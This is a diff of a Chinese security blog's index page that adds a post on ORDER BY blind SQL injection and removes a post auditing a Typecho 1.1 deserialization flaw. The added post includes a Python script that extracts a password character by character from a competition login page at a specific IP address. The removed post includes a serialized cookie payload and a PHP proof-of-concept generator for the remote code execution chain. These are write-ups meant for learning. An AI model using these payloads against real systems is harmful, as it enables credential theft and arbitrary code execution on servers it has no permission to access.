@@ -155,6 +155,75 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-order by" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/11/06/order by/">记一次order by盲注</a>
+    </h1>
+  
+
+        
+        <a href="/2019/11/06/order by/" class="archive-article-date">
+  	<time datetime="2019-11-06T15:48:43.214Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打一场小比赛遇到了order by盲注，这里记录一下原理</p>
+<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><p>首先有如下表</p>
+<p><img src="https://s2.ax1x.com/2019/10/30/KhlQDs.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;5&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">|    1 | 2        | 5                                |</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;6&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|    1 | 2        | 6                                |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;51&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">|    1 | 2        | 51                               |</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;52&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|    1 | 2        | 52                               |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>通过逐位判断便可得到password</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://120.55.43.255:13004/login.php"</span></span><br><span class="line">str_1 = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str_1:</span><br><span class="line">        payload = <span class="string">"' or 1 union select 1,'test','%s%s' order by 3#"</span>%(flag,s)</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>:<span class="string">'%s'</span>%(payload),<span class="string">'passwd'</span>: <span class="string">'1'</span>&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">if</span> ord(s) == <span class="number">97</span>:</span><br><span class="line">                flag += chr(<span class="number">57</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag += chr(ord(s)<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/xishaonian/p/7703486.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/7703486.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/11/06/order by/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-eval与assert" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -920,106 +989,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/05/17/jwt/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-typecho" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/05/14/typecho/">typecho V1.1代码审计-反序列化漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2019/05/14/typecho/" class="archive-article-date">
-  	<time datetime="2019-05-14T11:42:00.766Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x01-typecho简介"><a href="#0x01-typecho简介" class="headerlink" title="0x01 typecho简介"></a>0x01 typecho简介</h3><p>Typecho是一个简单，轻巧的博客程序。基于PHP，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。</p>
-<p>typecho V1.1存在反序列化漏洞，可以造成前台任意代码执行，也就是getshell</p>
-<p>下载地址:<a href="http://typecho.org/download" target="_blank" rel="noopener">http://typecho.org/download</a></p>
-<h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/build/install.php?finish</span><br></pre></td></tr></table></figure></p>
-<p>POST:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: __typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9</span><br><span class="line">Referer: http://127.0.0.1/build/install.php</span><br></pre></td></tr></table></figure></p>
-<p>效果如图:<br><img src="https://s2.ax1x.com/2019/05/15/EovCQI.jpg" alt="image"></p>
-<h3 id="0x03-漏洞审计"><a href="#0x03-漏洞审计" class="headerlink" title="0x03 漏洞审计"></a>0x03 漏洞审计</h3><p>漏洞发生点在./install.php 第230行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ./install.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));</span><br><span class="line">    Typecho_Cookie::delete(&apos;__typecho_config&apos;);</span><br><span class="line">    $db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</span><br><span class="line">    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">    Typecho_Db::set($db);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure></p>
-<p> 根据代码可知，$config的值是由变量__typecho_config经过base64解码和反序列化得到，这里跟进一下Typecho_Cookie类的get()函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ./var/Typecho/Cookie.php</span><br><span class="line"></span><br><span class="line">public static function get($key, $default = NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        $key = self::$_prefix . $key;</span><br><span class="line">        $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">        return is_array($value) ? $default : $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>可知变量__teypecho_config的值可以从Cookie的值传入，也可以从POST传入。</p>
-<p>接下来是反序列化unserialize的利用思考了，要由对应的魔术方法配合，这里有几个关键魔术方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__destruct() // 在对象被销毁的时候自动调用</span><br><span class="line">__wakeup() // 在反序列化的时候自动调用</span><br><span class="line">__toString() // 在调用对象的时候自动调用</span><br></pre></td></tr></table></figure></p>
-<p>继续审计，有代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</span><br></pre></td></tr></table></figure></p>
-<p>可知，这里对$config[‘adapter’]进行调用了，假设$config是一个数组的话，有如下代码(classA为一个可用的类)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$test = new classA();</span><br><span class="line">$config = array(</span><br><span class="line">    &apos;adapter&apos; =&gt; $test,</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
-<p>这样就完成了一个对象的调用了，所以用到__toString()函数，全局搜索一下，在var/Typecho/Feed.php 第284行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># var/Typecho/Feed.php</span><br><span class="line"></span><br><span class="line">foreach ($this-&gt;_items as $item) &#123;</span><br><span class="line">    $content .= &apos;&lt;item&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;title&gt;&apos; . htmlspecialchars($item[&apos;title&apos;]) . &apos;&lt;/title&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;link&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/link&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;guid&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/guid&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;pubDate&gt;&apos; . $this-&gt;dateFormat($item[&apos;date&apos;]) . &apos;&lt;/pubDate&gt;&apos; . self::EOL;</span><br><span class="line">    $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL;</span><br></pre></td></tr></table></figure>
-<p>这里调用了<br>$item[‘author’]-&gt;screenName ，注意有</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private $_items = array();</span><br></pre></td></tr></table></figure>
-<p>说明$_items是当前类的私有变量，所以需要关注一个魔法变量__get(),它会在读取不可访问的属性的值的时候调用，所以 $item[‘author’]-&gt;screenName的调用显然是使用了这个魔法函数，<br>全局搜索一下这个函数</p>
-<p>/var/Typecho/Request.php 第269行有</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __get($key)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>再跟踪一下get()函数,第295行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function get($key, $default = NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        switch (true) &#123;</span><br><span class="line">            case isset($this-&gt;_params[$key]):</span><br><span class="line">                $value = $this-&gt;_params[$key];</span><br><span class="line">                break;</span><br><span class="line">            case isset(self::$_httpParams[$key]):</span><br><span class="line">                $value = self::$_httpParams[$key];</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                $value = $default;</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default;</span><br><span class="line">        return $this-&gt;_applyFilter($value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>最后一行$value的值还要经过_applyFilter函数调用，跟踪一下这个函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private function _applyFilter($value)</span><br><span class="line">   &#123;</span><br><span class="line">       if ($this-&gt;_filter) &#123;</span><br><span class="line">           foreach ($this-&gt;_filter as $filter) &#123;</span><br><span class="line">               $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">               call_user_func($filter, $value);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $this-&gt;_filter = array();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return $value;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-<p>call_user_func()这个回调函数存在可利用漏洞,比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$filter= &apos;assert&apos;;</span><br><span class="line">$value = &apos;phpinfo()&apos;;</span><br><span class="line">call_user_func($filter, $value);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>我在is_array卡了一下，发现它这个最后取的是键值。。还以为是数组。。</p>
-<p>最后构造序列化payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Typecho_Request</span><br><span class="line">    &#123;</span><br><span class="line">        private $_params = array();</span><br><span class="line">        private $_filter = array();</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_params[&apos;screenName&apos;] = 1; // 执行的参数值</span><br><span class="line">            $this-&gt;_filter[0] = &apos;phpinfo&apos;; //filter执行的函数</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Typecho_Feed&#123;</span><br><span class="line">        const RSS2 = &apos;RSS 2.0&apos;; //进入toString内部判断条件</span><br><span class="line">        private $_items = array();</span><br><span class="line">        private $_type;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_type = self::RSS2;</span><br><span class="line">            $_item[&apos;author&apos;] = new Typecho_Request(); //Feed.php文件中触发__get()方法使用的对象</span><br><span class="line">        $_item[&apos;category&apos;] = array(new Typecho_Request());//触发错误</span><br><span class="line">            $this-&gt;_items[0] = $_item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $exp = new Typecho_Feed();</span><br><span class="line">    $a = array(</span><br><span class="line">        &apos;adapter&apos;=&gt;$exp, // Db.php文件中触发__toString()使用的对象</span><br><span class="line">        &apos;prefix&apos; =&gt;&apos;typecho_&apos;</span><br><span class="line">    );</span><br><span class="line">    echo urlencode(base64_encode(serialize($a)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="0x04-几个问题"><a href="#0x04-几个问题" class="headerlink" title="0x04 几个问题"></a>0x04 几个问题</h3><p>进入install.php会先执行两个判断，注意要绕过这两个判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//判断是否已经安装</span><br><span class="line">if (!isset($_GET[&apos;finish&apos;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &apos;/config.inc.php&apos;) &amp;&amp; empty($_SESSION[&apos;typecho&apos;])) &#123;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 挡掉可能的跨站请求</span><br><span class="line">if (!empty($_GET) || !empty($_POST)) &#123;</span><br><span class="line">    if (empty($_SERVER[&apos;HTTP_REFERER&apos;])) &#123;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);</span><br><span class="line">	if (!empty($parts[&apos;port&apos;])) &#123;</span><br><span class="line">        $parts[&apos;host&apos;] = &quot;&#123;$parts[&apos;host&apos;]&#125;:&#123;$parts[&apos;port&apos;]&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (empty($parts[&apos;host&apos;]) || $_SERVER[&apos;HTTP_HOST&apos;] != $parts[&apos;host&apos;]) &#123;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>get请求的时候带上finish参数</li>
-<li>post需要HTTP_REFERER参数,且HTTP_REFERER必须是本站</li>
-</ul>
-<p>POC执行会导致Typecho触发异常，并且内部设置了Typecho_Exception异常类，触发异常以后Typecho会自动能捕捉到异常，并执行异常输出</p>
-<p>install.php程序开头开启了ob_start(),该函数会将内部输出全部放入到缓冲区中，执行注入代码以后触发异常，导致ob_end_clean()执行，该函数会清空缓冲区。</p>
-<p>解决方案：让程序强制退出，不执行Exception，这样原来的缓冲区内容就会输出出来。</p>
-<p>在Feed.php中__toString方法中第293行，可以给item[‘category’]赋值上对象，让其用数组的方式遍历对象时触发错误，强制退出程序。</p>
-<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.在install.php的第230行，我们精心构造的poc被这里反序列化</span><br><span class="line">2.在install.php的第232行，程序调用了$config[&apos;adapter&apos;]，而$config[&apos;adapter&apos;]是我们精心构造的，具有利用点__toString()函数的类Typecho_Feed()的对象</span><br><span class="line">3.因为对象 $config[&apos;adapter&apos;]被调用，触发了__toString()函数</span><br><span class="line">4.而在__toString()函数里，程序调用了类Typecho_Feed()的私有变量$item[&apos;author&apos;]-&gt;screenName，而$item[&apos;author&apos;]-&gt;screenName是我们精心构造的，具有利用点__get()函数的类Typecho_Request的对象</span><br><span class="line">5.由于私有变量被调用，触发了__get()函数</span><br><span class="line">6.__get()中的get()函数调用了危险函数call_user_func()，导致任意命令执行</span><br></pre></td></tr></table></figure>
-<p>相关文章：<a href="https://paper.seebug.org/424/" target="_blank" rel="noopener">https://paper.seebug.org/424/</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/05/14/typecho/">展开全文 >></a>
         </p>
       
 
